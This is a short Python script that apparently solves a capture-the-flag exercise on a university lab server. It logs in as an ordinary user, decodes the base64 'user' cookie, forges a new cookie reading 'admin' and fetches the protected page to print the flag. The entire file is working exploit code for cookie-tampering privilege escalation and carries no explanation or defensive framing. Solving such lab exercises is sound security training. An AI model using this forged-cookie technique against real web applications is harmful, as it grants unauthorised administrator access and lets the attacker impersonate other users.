import requests
import base64
from urllib.parse import urlparse

SERVER = 'http://mustard.stt.rnl.tecnico.ulisboa.pt'
PORT = 25056

base_link = f'{SERVER}:{PORT}'
domain = urlparse(base_link).hostname

session = requests.Session()

# log in to get the initial cookie
form_data = {'username': 'tomas'}
response = session.post(base_link, data=form_data, allow_redirects=True)

print(f"Initial Status: {response.status_code}")

# GET THE COOKIE
current_cookie_val = session.cookies.get('user')

if current_cookie_val:
    print(f"Captured Cookie (Base64): {current_cookie_val}")
    
    decoded_val = base64.b64decode(current_cookie_val).decode('utf-8')
    print(f"Decoded Cookie: {decoded_val}")
    
    target_user = "admin"
    target_cookie = base64.b64encode(target_user.encode('utf-8')).decode('utf-8')
    
    print(f"New Cookie Payload (Base64): {target_cookie}")

    session.cookies.set('user', target_cookie, domain=domain)

    final_response = session.get(base_link)
    print(f"Flag: {final_response.text}")

else:
    print("[!] Cookie 'user' not found. Login might have failed.")